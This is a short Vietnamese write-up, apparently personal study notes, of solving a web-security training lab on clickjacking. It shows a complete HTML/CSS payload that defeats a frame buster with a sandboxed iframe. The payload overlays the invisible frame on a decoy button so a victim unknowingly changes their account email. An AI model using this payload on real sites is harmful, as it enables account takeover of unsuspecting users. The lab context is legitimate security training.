![[Pasted image 20261107123604.png|647]]
**Mục tiêu:** Vượt qua ==🟡frame buster== để thực hiện Clickjacking, lừa victim đổi email.

**Các bước mình làm:**

1. **Nhận diện vấn đề:** Lab này có một đoạn script chống nhúng iframe (frame buster). Để vượt qua, mình dùng thuộc tính `sandbox="allow-forms"` cho thẻ iframe. Thuộc tính này vô hiệu hóa các script JavaScript bên trong (làm chết frame buster), nhưng vẫn cho phép form hoạt động.

2. **Tạo Payload:** Lên Exploit Server, dán đoạn code sau vào Body (để `opacity: 0.1` để căn chỉnh):
```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 460px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms" src="https://0a1d002603d089c680a603fb00cd0052.web-security-academy.net/my-account?email=hacker@evil-user.net"></iframe>
```
*(Nhớ thay `YOUR-LAB-ID` bằng link lab của bạn)*
![[Pasted image 20261107123748.png]]
3. **Căn chỉnh:** Bấm **View exploit**, rê chuột vào chữ "Test me" đến khi thấy con trỏ chuyển thành hình bàn tay. Nếu lệch, mình chỉnh lại số `top` (ví dụ 380, 390...).

4. **Chốt hạ:** 
   * Đổi `opacity: 0.1` thành `0.0001` (để iframe tàng hình).
   * Đổi chữ "Test me" thành "Click me".
   * Đổi email trong URL thành một email mới chưa từng dùng (tránh lỗi trùng lặp email đã test).
   * Bấm **Store**, rồi **Deliver exploit to victim**.

Lab solved!
![[Pasted image 20261107123906.png]]